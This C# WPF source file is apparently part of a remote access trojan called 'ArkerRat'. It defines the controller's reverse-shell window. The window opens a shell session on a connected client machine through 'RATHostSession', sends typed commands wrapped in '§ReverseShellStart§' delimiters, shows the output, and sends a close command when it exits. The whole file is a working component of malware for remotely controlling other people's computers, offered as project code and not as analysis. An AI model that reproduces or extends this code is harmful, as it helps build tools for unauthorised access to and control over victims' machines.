using ArkerRatWpfVersion;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;

namespace ArkerRatWpfVersion
{
    /// <summary>
    /// Interaction logic for ReverseShellWindow.xaml
    /// </summary>
    public partial class ReverseShellWindow : Window
    {
        public RATHostSession clientSession { get; set; }
        public ReverseShellWindow(RATHostSession session)
        {
            InitializeComponent();
            reverseShellTextOutput.Document.Blocks.Clear();
            reverseShellTextOutput.IsReadOnly = true;
            clientSession = session;
            windowText.Content += " - " + clientSession.clientInfo[0];
            clientSession.reverseShellWindowIsAlreadyOpen = true;
            clientSession.SendData("§ReverseShellStart§§ReverseShellEnd§");
        }

        bool close = false;
        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            if (!close)
                e.Cancel = true;
        }

        public async void CloseWindow(object sender, RoutedEventArgs e)
        {
            await clientSession.SendData("§ReverseShellStart§close§ReverseShellEnd§");
            clientSession.reverseShellWindowIsAlreadyOpen = false;
            close= true;
            Close();
        }

        private void MinimizeReverseShell(object sender, RoutedEventArgs e)
        {
            this.WindowState = WindowState.Minimized;
        }

        private void Window_MouseDown(object sender, MouseButtonEventArgs e)
        {
            if (e.LeftButton == MouseButtonState.Pressed)
            {
                DragMove();
            }
        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {

        }

        public async Task ReversShellFunction(string data)
        {
            lock (GlobalVariables._lock)
            {
                Application.Current.Dispatcher.BeginInvoke(new Action(() =>
                {
                    reverseShellTextOutput.AppendText(data);
                    reverseShellTextOutput.ScrollToEnd();
                    reverseShellTextInput.Focus();
                }));
            }
        }

        private async void EnterPressed(object sender, KeyEventArgs e)
        {
            if(e.Key == Key.Enter)
            {
                await clientSession.SendData("§ReverseShellStart§"+reverseShellTextInput.Text+"§ReverseShellEnd§");
                reverseShellTextInput.Clear();
            }
        }
    }
}
